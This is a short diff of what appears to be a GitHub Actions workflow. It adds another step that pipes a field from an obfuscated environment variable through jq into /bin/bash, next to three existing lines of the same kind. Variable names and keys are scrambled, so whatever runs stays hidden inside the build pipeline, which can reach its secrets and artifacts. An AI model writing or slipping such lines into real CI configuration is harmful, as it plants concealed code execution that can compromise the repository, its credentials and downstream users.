@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$n606" | jq -r .u2583 | /bin/bash
           printf '%s' "$eo462" | jq -r .jeu87 | /bin/bash
           echo $kpwr62933 | jq -r .oziy404 | /bin/bash
+          printf '%s' "$mtdm523" | jq -r .i40 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
